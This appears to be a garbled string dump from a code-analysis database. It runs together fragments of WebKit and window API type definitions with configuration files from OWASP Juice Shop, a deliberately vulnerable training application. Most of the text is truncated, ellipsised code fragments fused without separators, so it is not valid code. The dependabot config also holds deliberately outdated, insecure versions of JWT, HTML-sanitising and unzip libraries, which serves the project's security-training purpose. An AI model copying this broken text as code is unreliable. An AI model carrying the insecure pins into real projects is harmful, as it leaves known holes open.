 * @return {undefined}
 
 * @param {Element} element
 * @param {string} pseudoElement
 * @param {boolean=} opt_authorOnly
 * @return {CSSRuleList}
 * @nosideeffects
 
 * @param {string} contextId
 * @param {string} name
 * @param {number} width
 * @param {number} height
 * @nosideeffects
 * @return {undefined}
 
 * @param {number} x
 * @param {number} y
 * @return {?Range}
 * @nosideeffects
 * @see https://developer.mozilla.org/en-US/docs/Web/API/Document/caretRangeFromPoint
 scrollIntoViewIfNeededopt_centerMemoryInfoScriptProfileNodefunctionNametotalTimeselfTimenumberOfCallsvisiblecallUIDScriptProfileprofilesdevicePixelRatiobaseNodebaseOffsetextentNodeextentOffsetsetBaseAndExtentmodifyaltergranularitygetMatchedCSSRulespseudoElementopt_authorOnlygetCSSCanvasContextcaretRangeFromPointDefinitions for all the extensions over W3C's DOM
specification by WebKit. This file depends on w3c_dom2.js.
All the provided definitions has been type annotated
*https://bugzilla.mozilla.org/show_bug.cgi?id=403510
http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.idl
http://trac.webkit.org/browser/trunk/Source/WebCore/page/MemoryInfo.cpphttp://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfileNode.idlArray.<ScriptProfileNode>http://trac.webkit.org/browser/trunk/Source/WebCore/inspector/ScriptProfile.idlhttp://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.idl
http://trac.webkit.org/browser/trunk/Source/WebCore/page/Console.cppArray.<ScriptProfile>http://developer.android.com/reference/android/webkit/WebView.html?Rangehttps://developer.mozilla.org/en-US/docs/Web/API/Document/caretRangeFromPointElement ... er) {};Element ... ter) {}Element ... fNeededscrollI ... fNeededMemoryI ... apSize;MemoryI ... eapSizeMemoryInfo.prototypeMemoryI ... eLimit;MemoryI ... zeLimitScriptP ... onName;ScriptP ... ionNameScriptP ... ototypeScriptP ... pe.url;ScriptP ... ype.urlScriptP ... Number;ScriptP ... eNumberScriptP ... alTime;ScriptP ... talTimeScriptP ... lfTime;ScriptP ... elfTimeScriptP ... fCalls;ScriptP ... OfCallsScriptP ... ildren;ScriptP ... hildrenScriptP ... isible;ScriptP ... visibleScriptP ... allUID;ScriptP ... callUIDScriptP ... .title;ScriptP ... e.titleScriptP ... pe.uid;ScriptP ... ype.uidScriptP ... e.head;ScriptP ... pe.headConsole ... ofiles;Console ... rofilesConsole ... memory;Console ... .memoryWindow. ... onsole;Window. ... consolevar console;Window. ... lRatio;Window. ... elRatioSelecti ... seNode;Selecti ... aseNodeSelecti ... eOffsetSelecti ... ntNode;Selecti ... entNodeSelecti ... tOffsetSelecti ... e.type;Selecti ... pe.typeSelecti ... e.emptySelecti ... dExtentSelecti ... ty) {};Selecti ... ity) {}Selecti ... .modifyViewCSS ... ly) {};ViewCSS ... nly) {}ViewCSS ... SSRulesDocumen ... ht) {};Documen ... ght) {}Documen ... ContextH:/codeql/javascript/tools/data/externs/web/webkit_event.js
 * @fileoverview Definitions for all the extensions over W3C's
 *  event specification by WebKit. This file depends on w3c_event.js.
 *  All the provided definitions have been type annotated
 *
 * @externs
 
 * @constructor
 * @extends {Event}
 * @see http://developer.apple.com/library/safari/documentation/AudioVideo/Reference/WebKitAnimationEventClassReference/WebKitAnimationEvent/WebKitAnimationEvent.html
 wheelDeltaXwheelDeltaYWebKitAnimationEventanimationNameelapsedTimeDefinitions for all the extensions over W3C's
event specification by WebKit. This file depends on w3c_event.js.
All the provided definitions have been type annotated
*http://developer.apple.com/library/safari/documentation/AudioVideo/Reference/WebKitAnimationEventClassReference/WebKitAnimationEvent/WebKitAnimationEvent.htmlEvent.p ... DeltaX;Event.p ... lDeltaXEvent.p ... DeltaY;Event.p ... lDeltaYWebKitA ... onName;WebKitA ... ionNameWebKitA ... ototypeWebKitA ... edTime;WebKitA ... sedTimeH:/codeql/javascript/tools/data/externs/web/webkit_notifications.js
 * @fileoverview Definitions for W3C's Notifications specification.
 * @externs
 
 * @typedef {{dir: (string|undefined), lang: (string|undefined),
 *            body: (string|undefined), tag: (string|undefined),
 *            icon: (string|undefined),
 *            requireInteraction: (boolean|undefined),
 *            actions: (!Array<!NotificationAction>|undefined)}}
 * @see http://notifications.spec.whatwg.org/#notificationoptions
 
 * @typedef {{action: string, title: string, icon: (string|undefined)}}
 * @see https://notifications.spec.whatwg.org/#dictdef-notificationoptions
 
 * @typedef {{tag: (string|undefined)}}
 * @see https://notifications.spec.whatwg.org/#dictdef-getnotificationoptions
  @interface /** @interface */
 * @param {string} title
 * @param {NotificationOptions=} opt_options
 * @constructor
 * @implements {EventTarget}
 * @see http://notifications.spec.whatwg.org/#notification
 
 * @param {NotificationPermissionCallback=} opt_callback
 * @return {!Promise<string>}
 
 * The string used by clients to identify the notification.
 * @type {string}
 
 * The ID used by clients to uniquely identify notifications to eliminate
 * duplicate notifications.
 * @type {string}
 * @deprecated Use NotificationOptions.tag instead.
 
 * The string used by clients to specify the directionality (rtl/ltr) of the
 * notification.
 * @type {string}
 * @deprecated Use NotificationOptions.titleDir and bodyDir instead.
 
 * Displays the notification.
 * @return {undefined}
 
 * Prevents the notification from being displayed, or closes it if it is already
 * displayed.
 * @return {undefined}
 
 * An event handler called when notification is closed.
 * @type {?function(Event)}
 
 * An event handler called if the notification could not be displayed due to
 * an error (i.e. resource could not be loaded).
 * @type {?function(Event)}
 
 * An event handler called when the notification has become visible.
 * @type {?function(Event)}
 * @deprecated Use onshow instead.
 
 * An event handler called when the notification has become visible.
 * @type {?function(Event)}
 
 * An event handler called when the notification has been clicked on.
 * @type {?function(Event)}
 
 * @typedef {function(string)}
 * @see http://notifications.spec.whatwg.org/#notificationpermissioncallback
 
 * @constructor
 * @see http://dev.w3.org/2006/webapi/WebNotifications/publish/#dialog-if
 * @deprecated Use Notification instead.
 
 * Creates a text+icon notification and displays it to the user.
 * @param {string} iconUrl
 * @param {string} title
 * @param {string} body
 * @return {Notification}
 
 * Creates an HTML notification and displays it to the user.
 * @param {string} url
 * @return {Notification}
 
 * Checks if the user has permission to display notifications.
 * @return {number}
 
 * Requests permission from the user to display notifications.
 * @param {Function=} opt_callback
 * @return {void}
 
 * WebKit browsers expose the NotificationCenter API through
 * window.webkitNotifications.
 * @type {NotificationCenter}
 
 * @see https://notifications.spec.whatwg.org/#notificationevent
 * @constructor
 * @param {string} type
 * @param {!ExtendableEventInit=} opt_eventInitDict
 * @extends {ExtendableEvent}
  @type {?Notification} NotificationActionNotificationOptionsInterface_requireInteractionrequestPermissionreplaceIdondisplayonshowNotificationPermissionCallbackNotificationCentercreateNotificationiconUrlcreateHTMLNotificationcheckPermissionwebkitNotificationsNotificationEventnotificationDefinitions for W3C's Notifications specification.
{dir: (string|undefined), lang: (string|undefined), body: (string|undefined), tag: (string|undefined), icon: (string|undefined), requireInteraction: (boolean|undefined), actions: (!Array.<!NotificationAction>|undefined)}actions(!Array.<!NotificationAction>|undefined)!Array.<!NotificationAction>Array.<!NotificationAction>!NotificationActionhttp://notifications.spec.whatwg.org/#notificationoptions{action: string, title: string, icon: (string|undefined)}https://notifications.spec.whatwg.org/#dictdef-notificationoptions{tag: (string|undefined)}https://notifications.spec.whatwg.org/#dictdef-getnotificationoptionshttp://notifications.spec.whatwg.org/#notificationNotificationPermissionCallback=The string used by clients to identify the notification.The ID used by clients to uniquely identify notifications to eliminate
duplicate notifications.Use NotificationOptions.tag instead.The string used by clients to specify the directionality (rtl/ltr) of the
notification.Use NotificationOptions.titleDir and bodyDir instead.Displays the notification.Prevents the notification from being displayed, or closes it if it is already
displayed.An event handler called when notification is closed.An event handler called if the notification could not be displayed due to
an error (i.e. resource could not be loaded).An event handler called when the notification has become visible.Use onshow instead.An event handler called when the notification has been clicked on.http://notifications.spec.whatwg.org/#notificationpermissioncallbackhttp://dev.w3.org/2006/webapi/WebNotifications/publish/#dialog-if
Use Notification instead.Creates a text+icon notification and displays it to the user.Creates an HTML notification and displays it to the user.Checks if the user has permission to display notifications.Requests permission from the user to display notifications.WebKit browsers expose the NotificationCenter API through
window.webkitNotifications.https://notifications.spec.whatwg.org/#notificationevent
var Not ... ptions;var Not ... Action;GetNoti ... Optionsvar Not ... on() {}Notific ... on() {}Notific ... erface_Notific ... pe.dir;Notific ... ype.dirNotific ... ototypeNotific ... e.lang;Notific ... pe.langNotific ... e.body;Notific ... pe.bodyNotific ... pe.tag;Notific ... ype.tagNotific ... e.icon;Notific ... pe.iconNotific ... action;Notific ... ractionNotific ... ission;Notific ... missionNotific ... ck) {};Notific ... ack) {}Notific ... re) {};Notific ... ure) {}Notific ... istenerNotific ... vt) {};Notific ... evt) {}Notific ... chEventNotific ... .title;Notific ... e.titleNotific ... laceId;Notific ... placeIdNotific ... n() {};Notific ... pe.showNotific ... .cancelNotific ... e.closeNotific ... nclose;Notific ... oncloseNotific ... nerror;Notific ... onerrorNotific ... isplay;Notific ... displayNotific ... onshow;Notific ... .onshowNotific ... nclick;Notific ... onclickvar Not ... llback;Notific ... allbackNotific ... dy) {};Notific ... ody) {}Notific ... icationfunctio ... ody) {}Notific ... rl) {};Notific ... url) {}createH ... icationWindow. ... ations;Window. ... cationsNotific ... cation;H:/codeql/javascript/tools/data/externs/web/webkit_usercontent.js
 * @fileoverview Definitions for WKWebView's User Content interface.
 *   https://developer.apple.com/library/prerelease/ios/documentation/WebKit/Reference/WKUserContentController_Ref/
 *   https://trac.webkit.org/browser/trunk/Source/WebCore/page/WebKitNamespace.h
 *
 * @externs
 
 * @type {!UserMessageHandlersNamespace}
 
 * @constructor
 * @implements {IObject<string, UserMessageHandler>}
 
 * @param {*} message
 * @return {undefined}
 
 * @type {!WebKitNamespace}
 * @const
 WebKitNamespacemessageHandlersUserMessageHandlersNamespaceUserMessageHandlerwebkitDefinitions for WKWebView's User Content interface.
https://developer.apple.com/library/prerelease/ios/documentation/WebKit/Reference/WKUserContentController_Ref/
https://trac.webkit.org/browser/trunk/Source/WebCore/page/WebKitNamespace.h
*!UserMessageHandlersNamespaceIObject.<string, UserMessageHandler>!WebKitNamespaceWebKitN ... ndlers;WebKitN ... andlersWebKitN ... ototypeUserMes ... mespaceUserMes ... ge) {};UserMes ... age) {}UserMes ... MessageUserMes ... ototypevar webkit;H:/codeql/javascript/tools/data/externs/web/webstorage.js
 * @fileoverview Definitions for W3C's WebStorage specification.
 * This file depends on html5.js.
 * @externs
 
 * @interface
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-interface
 
 * @param {number} index
 * @return {?string}
 
 * @param {string} key
 * @return {?string}
 
 * @param {string} key
 * @param {string} data
 * @return {void}
 
 * @param {string} key
 * @return {void}
 
 * @interface
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-sessionstorage-attribute
 
 * @type {Storage}
 
 * Window implements WindowSessionStorage
 *
 * @type {Storage}
 
 * @interface
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-localstorage-attribute
 
 * Window implements WindowLocalStorage
 *
 * @type {Storage}
 
 * This is the storage event interface.
 * @see http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-event
 * @extends {Event}
 * @constructor
 
 * @type {?Storage}
 
 * @param {string} typeArg
 * @param {boolean} canBubbleArg
 * @param {boolean} cancelableArg
 * @param {string} keyArg
 * @param {?string} oldValueArg
 * @param {?string} newValueArg
 * @param {string} urlArg
 * @param {?Storage} storageAreaArg
 * @return {void}
 StoragegetItemsetItemremoveItemWindowSessionStorageWindowLocalStoragelocalStorageStorageEventstorageAreainitStorageEventkeyArgoldValueArgurlArgstorageAreaArgDefinitions for W3C's WebStorage specification.
This file depends on html5.js.
http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-interfacehttp://www.w3.org/TR/2011/CR-webstorage-20111208/#the-sessionstorage-attributeWindow implements WindowSessionStoragehttp://www.w3.org/TR/2011/CR-webstorage-20111208/#the-localstorage-attributeWindow implements WindowLocalStorageThis is the storage event interface.http://www.w3.org/TR/2011/CR-webstorage-20111208/#the-storage-event
?StorageStorage ... length;Storage ... .lengthStorage.prototypeStorage ... ex) {};Storage ... dex) {}Storage ... ype.keyStorage ... ey) {};Storage ... key) {}Storage ... getItemStorage ... ta) {};Storage ... ata) {}Storage ... setItemStorage ... oveItemStorage ... n() {};Storage ... on() {}Storage ... e.clearWindowS ... torage;WindowS ... StorageWindowS ... ototypeWindowL ... torage;WindowL ... StorageWindowL ... ototypeStorage ... pe.key;Storage ... dValue;Storage ... ldValueStorage ... wValue;Storage ... ewValueStorage ... pe.url;Storage ... ype.urlStorage ... geArea;Storage ... ageAreaStorage ... rg) {};Storage ... Arg) {}Storage ... geEventH:/codeql/javascript/tools/data/externs/web/whatwg_encoding.js
 * @fileoverview Definitions for WHATWG's Encoding specification
 *     https://encoding.spec.whatwg.org
 * @externs
 
 * @param {!BufferSource=} input
 * @param {?Object=} options
 * @return {!string}
 * @see https://encoding.spec.whatwg.org/#textdecoder
 
 * @constructor
 * @param {string=} utfLabel
 /**\n *  ... bel\n */
 * @param {string=} input
 * @return {!Uint8Array}
 utfLabelDefinitions for WHATWG's Encoding specification
https://encoding.spec.whatwg.org
!BufferSource=?Object=https://encoding.spec.whatwg.org/#textdecoderH:/codeql/javascript/tools/data/externs/web/window.js
 * @fileoverview JavaScript Built-Ins for windows properties.
 *
 * @externs
 * @author stevey@google.com (Steve Yegge)
  Window properties// Window properties Only common properties are here.  Others such as open()// Only ...  open() should be used with an explicit Window object.// shou ... object.
 * @type {!Window}
 * @see https://developer.mozilla.org/en/DOM/window.top
 * @const
 
 * @type {!Navigator}
 * @see https://developer.mozilla.org/en/DOM/window.navigator
 * @const
 
 * @type {!HTMLDocument}
 * @see https://developer.mozilla.org/en/DOM/window.document
 * @const
 
 * @type {!Location}
 * @see https://developer.mozilla.org/en/DOM/window.location
 * @const
 * @suppress {duplicate}
 * @implicitCast
 
 * @type {!Screen}
 * @see https://developer.mozilla.org/En/DOM/window.screen
 * @const
 
 * @type {!Window}
 * @see https://developer.mozilla.org/En/DOM/Window.self
 * @const
  Magic functions for Firefox's LiveConnect.// Magi ... onnect. We'll probably never use these in practice. But redefining them// We'l ... ng them will fire up the JVM, so we want to reserve the symbol names.// will ...  names.
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaArray
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaClass
  We just ripped this from the FF source; it doesn't appear to be// We j ... r to be publicly documented.// publ ... mented.
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaObject
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaPackage
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Packages
 
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/java
 /**\n *  ... ava\n */
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/netscape
 /**\n *  ... ape\n */
 * @see https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/sun
 /**\n *  ... sun\n */
 * @param {number|undefined|null} immediateID
 * @see https://developer.mozilla.org/en-US/docs/DOM/window.clearImmediate
 * @see http://msdn.microsoft.com/en-us/library/ie/hh924825(v=vs.85).aspx
 * @return {undefined}
 
 * @param {number|undefined?} intervalID
 * @see https://developer.mozilla.org/en/DOM/window.clearInterval
 * @suppress {duplicate}
 * @return {undefined}
 
 * @param {number|undefined?} timeoutID
 * @see https://developer.mozilla.org/en/DOM/window.clearTimeout
 * @suppress {duplicate}
 * @return {undefined}
 
 * @param {*} message
 * @return {boolean}
 * @see https://developer.mozilla.org/en/DOM/window.confirm
 /**\n *  ... irm\n */
 * @see https://developer.mozilla.org/en/DOM/window.dump
 * @param {*} x
 * @return {undefined}
 
 * @param {string} message
 * @param {string=} opt_value
 * @return {?string}
 * @see https://developer.mozilla.org/en/DOM/window.prompt
 /**\n *  ... mpt\n */
 * @param {function()} callback
 * @return {number}
 * @see https://developer.mozilla.org/en-US/docs/DOM/window.setImmediate
 * @see http://msdn.microsoft.com/en-us/library/ie/hh773176(v=vs.85).aspx
 
 * @param {Function|string} callback
 * @param {number=} opt_delay
 * @return {number}
 * @see https://developer.mozilla.org/en/DOM/window.setInterval
 * @see https://html.spec.whatwg.org/multipage/webappapis.html#timers
 
 * @param {Function|string} callback
 * @param {number=} opt_delay
 * @param {...*} var_args
 * @return {number}
 * @see https://developer.mozilla.org/en/DOM/window.setTimeout
 * @see https://html.spec.whatwg.org/multipage/webappapis.html#timers
 screenJavaArrayJavaClassJavaMemberJavaObjectJavaPackagePackagesjavanetscapesunimmediateIDintervalIDtimeoutIDconfirmdumpopt_delayJavaScript Built-Ins for windows properties.
*https://developer.mozilla.org/en/DOM/window.top
!Navigatorhttps://developer.mozilla.org/en/DOM/window.navigator
https://developer.mozilla.org/en/DOM/window.document
https://developer.mozilla.org/en/DOM/window.location
!Screenhttps://developer.mozilla.org/En/DOM/window.screen
https://developer.mozilla.org/En/DOM/Window.self
https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaArrayhttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaClasshttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaObjecthttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/JavaPackagehttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Packageshttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/javahttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/netscapehttps://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/sun(number|undefined|null)https://developer.mozilla.org/en-US/docs/DOM/window.clearImmediate
http://msdn.microsoft.com/en-us/library/ie/hh924825(v=vs.85).aspx
(number|undefined?)undefined?https://developer.mozilla.org/en/DOM/window.clearInterval
https://developer.mozilla.org/en/DOM/window.clearTimeout
https://developer.mozilla.org/en/DOM/window.confirmhttps://developer.mozilla.org/en/DOM/window.dump
https://developer.mozilla.org/en/DOM/window.prompthttps://developer.mozilla.org/en-US/docs/DOM/window.setImmediate
http://msdn.microsoft.com/en-us/library/ie/hh773176(v=vs.85).aspx(Function|string)https://developer.mozilla.org/en/DOM/window.setInterval
https://html.spec.whatwg.org/multipage/webappapis.html#timershttps://developer.mozilla.org/en/DOM/window.setTimeout
var top;var navigator;var document;var location;var screen;var self;var JavaArray;var JavaClass;var JavaMember;var JavaObject;var JavaPackage;var Packages;var java;var netscape;var sun;functio ... eID) {}functio ... lID) {}functio ... tID) {}function dump(x) {}P:/My Drive/Git/juice-shop/.codeclimate.ymlP:/My Drive/Git/juice-shopP:/My Drive/GitP:/My DriveP:/tag:yaml.org,2002:str"2"fixmetag:yaml.org,2002:booltag:yaml.org,2002:mapenabled: trueduplicationfixme:checksfile-linesthreshold300tag:yaml.org,2002:intthreshold: 300config:method-lines30threshold: 30method-complexitythreshold: 7similar-codeenabled: falseidentical-codefile-lines:exclude_patterns**/*conf.js'**/*conf.js'Gruntfile.js'Gruntfile.js'data/datacreator.ts'data/d ... tor.ts'frontend/src/hacking-instructor/**/*.ts'fronte ... */*.ts'frontend/src/assets/private/*.js'fronte ... e/*.js'lib/logger.ts'lib/logger.ts'data/static/codefixes/**'data/s ... xes/**'tag:yaml.org,2002:seq- '**/*conf.js'version: "2"yamlP:/My Drive/Git/juice-shop/.dependabot/config.ymlP:/My Drive/Git/juice-shop/.dependabotupdate_configspackage_manager"javascript"/"/"update_schedulelive"live"target_branchdevelop"develop"default_reviewersbkimminich"bkimminich"- "bkimminich"default_labelsdependencies"dependencies"- "dependencies"ignored_updatesdependency_nameexpress-jwt"express-jwt"version_requirement0.1.3"0.1.3"depende ... ss-jwt"match:sanitize-html"sanitize-html"1.4.2"1.4.2"depende ... e-html"unzipper"unzipper"0.9.15"0.9.15"depende ... zipper"jsonwebtoken"jsonwebtoken"0.4.0"0.4.0"depende ... btoken"- match:package ... script"/frontend"/frontend"- packa ... script"version: 1P:/My Drive/Git/juice-shop/.eslintrc.js
 * Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 /*\r\n *  ... IT\r\n */ conflicting with recommendation from @typescript-eslint/no-floating-promises// conf ... romises FIXME warnings below this line need to be checked and fixed.// FIXM ...  fixed.'standard-with-typescript'browserjasminemochajestglobalsAtomics'readonly'SharedArrayBufferparserOptionsecmaVersion2018project'./tsconfig.json'ignorePatterns'.eslintrc.js''app/private/**''vagrant/**''frontend/**''data/static/codefixes/**''dist/**'overrides'**/*.ts'parser'@typescript-eslint/parser''no-void''off''@typescript-eslint/explicit-function-return-type''@typescript-eslint/strict-boolean-expressions''@typescript-eslint/no-var-requires'module. ... \n  ]\r\n}{\r\n  ex ... \n  ]\r\n}extends ... script''standa ... script'standard-with-typescriptenv: {\r ... ue\r\n  }{\r\n     ... ue\r\n  }browser: truenode: truejasmine: truemocha: truejest: trueglobals ... y'\r\n  }{\r\n     ... y'\r\n  }Atomics: 'readonly'SharedA ... adonly'parserO ... n'\r\n  }{\r\n     ... n'\r\n  }ecmaVersion: 2018project ... g.json'./tsconfig.json/tsconfigignoreP ... *'\r\n  ][\r\n     ... *'\r\n  ].eslintrc.jseslintrcjsapp/private/**vagrant/**frontend/**dist/**overrid ...  }\r\n  ][\r\n     ...  }\r\n  ]{\r\n     ... \r\n    }files: ['**/*.ts']['**/*.ts']**/*.tsparser: ... parser''@types ... parser'@typescript-eslint/parserrules:  ...       }{\r\n     ...       }'no-void': 'off'no-void'@types ... : 'off''@types ... n-type'@typescript-eslint/explicit-function-return-type'@types ... ssions'@typescript-eslint/strict-boolean-expressions'@types ... quires'@typescript-eslint/no-var-requiresP:/My Drive/Git/juice-shop/.github/FUNDING.ymlP:/My Drive/Git/juice-shop/.githubcustomhttps://sponsor.owasp-juice.shophttps:/ ... ce.shopgithubOWASPcustom: ... ce.shopP:/My Drive/Git/juice-shop/.github/ISSUE_TEMPLATE/config.ymlP:/My Drive/Git/juice-shop/.github/ISSUE_TEMPLATEcontact_linksSupport request\u2753Support requesthttps://gitter.im/bkimminich/juice-shophttps:/ ... ce-shopaboutQuestions and requests for supportQuestio ... supportname: \u2753 ... request- name: ... requestcontact_links:P:/My Drive/Git/juice-shop/.github/workflows/ci.ymlP:/My Drive/Git/juice-shop/.github/workflowsCI/CD Pipeline"CI/CD Pipeline"branches-ignorel10n_developgh-pages- l10n_developpaths-ignore*.md'*.md'LICENSE'LICENSE'monitoring/grafana-dashboard.json'monito ... d.json'screenshots/**'screenshots/**'- '*.md'tags-ignore'*'- '*'branches-ignore:pull_requestdata/static/i18n/*.json'data/s ... *.json'frontend/src/assets/i18n/*.json'fronte ... *.json'paths-ignore:push:NODE_DEFAULT_VERSIONANGULAR_CLI_VERSIONCYCLONEDX_NPM_VERSIONCYCLONE ... VERSION^1.12.0'^1.12.0'NODE_DE ... ION: 20jobslintruns-onubuntu-lateststepsCheck out Git repository"Check  ... sitory"usesactions/checkout@3df4ab11eba7bda6032a0b82a6bb43b11571feacactions ... 571feacname: " ... sitory"Use Node.js 18"Use Node.js 18"actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69dactions ... b3fb69dnode-version${{ env.NODE_DEFAULT_VERSION }}${{ env ... SION }}node-ve ... SION }}name: " ... .js 18"Install CLI tools"Install CLI tools"npm install -g @angular/cli@$ANGULAR_CLI_VERSIONnpm ins ... VERSIONname: " ...  tools"Install application minimalistically"Instal ... ically"npm install --ignore-scripts
cd frontend
npm install --ignore-scripts --legacy-peer-deps
|name: " ... ically"Lint source code"Lint source code"npm run lintname: " ... e code"Lint customization configs"Lint c ... onfigs"npm run lint:config -- -f ./config/7ms.yml && npm run lint:config -- -f ./config/addo.yml && npm run lint:config -- -f ./config/bodgeit.yml && npm run lint:config -- -f ./config/ctf.yml && npm run lint:config -- -f ./config/default.yml && npm run lint:config -- -f ./config/fbctf.yml && npm run lint:config -- -f ./config/juicebox.yml && npm run lint:config -- -f ./config/mozilla.yml && npm run lint:config -- -f ./config/oss.yml && npm run lint:config -- -f ./config/quiet.yml && npm run lint:config -- -f ./config/tutorial.yml && npm run lint:config -- -f ./config/unsafe.yml
>name: " ... onfigs"- name: ... sitory"runs-on ... -latestcoding-challenge-rsnwindows-latestInstall application"Instal ... cation"npm installname: " ... cation"Check coding challenges for accidental code discrepancies"Check  ... ancies"npm run rsnname: " ... ancies"${{ matrix.os }}matrixmacos-latest[ubuntu ... latest][18, 20, 21]os: [ub ... stantlymatrix:ifgithub.repository == 'juice-shop/juice-shop' || (github.repository != 'juice-shop/juice-shop' && matrix.os == 'ubuntu-latest' && matrix.node-version == '18')github. ... = '18')Use Node.js ${{ matrix.node-version }}"Use No ... ion }}"${{ matrix.node-version }}${{ mat ... sion }}node-ve ... sion }}name: " ... ion }}"Execute unit tests"Execute unit tests"nick-invision/retry@943e742917ac94714d2f408a0e8320f2d1fcafcdnick-in ... 1fcafcdtimeout_minutesmax_attemptsnpm testtimeout_minutes: 15name: " ...  tests"Copy unit test coverage data"Copy u ... e data"cp build/reports/coverage/frontend-tests/lcov.info frontend-lcov.info
cp build/reports/coverage/server-tests/lcov.info server-lcov.info
name: " ... e data"Upload unit test coverage data"Upload ... e data"github.repository == 'juice-shop/juice-shop' && github.event_name == 'push' && matrix.os == 'ubuntu-latest' && matrix.node-version == '18'github. ... == '18'actions/upload-artifact@a8a3f3ad30e3422c9c7b888a15615d19a852ae32actions ... 852ae32unit-test-lcovfrontend-lcov.info
server-lcov.info
name: unit-test-lcovruns-on ... x.os }}api-testos: [ub ... latest]Execute integration tests"Execut ...  tests"NODE_ENVNODE_ENV: testnpm run frisbytimeout_minutes: 5Copy API test coverage data"Copy A ... e data"cp build/reports/coverage/api-tests/lcov.info api-lcov.infocp buil ... ov.infoUpload API test coverage dataapi-test-lcovapi-lcov.info
name: api-test-lcovcoverage-reportneeds[test, api-test]github.repository == 'juice-shop/juice-shop' && github.event_name == 'push'github. ...  'push'Download unit test coverage data"Downlo ... e data"actions/download-artifact@9bc31d5ccc31df68ecc42ccf4149144866c47d8aactions ... 6c47d8aDownload API test coverage dataPublish coverage to Codeclimate"Publis ... limate"CC_TEST_REPORTER_ID${{ secrets.CC_TEST_REPORTER_ID }}${{ sec ... R_ID }}CC_TEST ... R_ID }}curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
chmod +x ./cc-test-reporter
sed -i s/SF:/SF:frontend\\//g frontend-lcov.info
./cc-test-reporter format-coverage -t lcov -o codeclimate.frontend.json frontend-lcov.info
./cc-test-reporter format-coverage -t lcov -o codeclimate.server.json server-lcov.info
./cc-test-reporter format-coverage -t lcov -o codeclimate.api.json api-lcov.info
./cc-test-reporter sum-coverage codeclimate.*.json -p 3
./cc-test-reporter upload-coverage
bashname: " ... limate"needs:  ... i-test]custom-config-testExecute server tests for each custom configuration"Execut ... ration"NODE_ENV=7ms npm run test:server && NODE_ENV=addo npm run test:server && NODE_ENV=bodgeit npm run test:server && NODE_ENV=ctf npm run test:server && NODE_ENV=fbctf npm run test:server && NODE_ENV=juicebox npm run test:server && NODE_ENV=mozilla npm run test:server && NODE_ENV=oss npm run test:server && NODE_ENV=quiet npm run test:server && NODE_ENV=tutorial npm run test:server && NODE_ENV=unsafe npm run test:server
timeout_minutes: 10name: " ... ration"e2e[chrome]fail-fastnpm install -g @angular/clinpm ins ... lar/cliExecute end-to-end tests on Ubuntu"Execut ... Ubuntu"${{ matrix.os == 'ubuntu-latest' }}${{ mat ... est' }}cypress-io/github-action@59810ebfa5a5ac6fcfdcfdf036d1cd4d083a88f2cypress ... 83a88f2${{ matrix.browser }}${{ mat ... wser }}npm startwait-onhttp://localhost:3000http:// ... st:3000${{ matrix.browser }} @ ${{ matrix.os }}${{ mat ... x.os }}install: falseSOLUTIONS_WEBHOOK${{ secrets.E2E_SOLUTIONS_WEBHOOK }}${{ sec ... HOOK }}CYPRESS_RECORD_KEY${{ secrets.CYPRESS_RECORD_KEY }}${{ sec ... _KEY }}GITHUB_TOKEN${{ secrets.GITHUB_TOKEN }}${{ sec ... OKEN }}SOLUTIO ... HOOK }}name: " ... Ubuntu"Execute end-to-end tests on Mac"Execut ... on Mac"${{ matrix.os == 'macos-latest' }}CYPRESS_CACHE_FOLDER/Users/runner/Library/Caches/Cypress/Users/ ... CypressCYPRESS ... Cypressname: " ... on Mac"smoke-testnpm install -g @angular/cli@$ANGULAR_CLI_VERSION
npm install -g @cyclonedx/cyclonedx-npm@$CYCLONEDX_NPM_VERSION
npm install -g grunt-cli
Set packaging options for Grunt"Set pa ...  Grunt"echo "PCKG_OS_NAME=linux" >> $GITHUB_ENV
echo "PCKG_NODE_VERSION=18" >> $GITHUB_ENV
echo "PCKG_CPU_ARCH=x64" >> $GITHUB_ENV
name: " ...  Grunt"Package application"Packag ... cation"npm install --production
npm run package:ci
Unpack application archive"Unpack ... rchive"cd dist
tar -zxf juice-shop-*.tgz
name: " ... rchive"Execute smoke test"Execute smoke test"cd dist/juice-shop_*
npm start &
cd ../..
chmod +x test/smoke/smoke-test.sh
test/smoke/smoke-test.sh http://localhost:3000
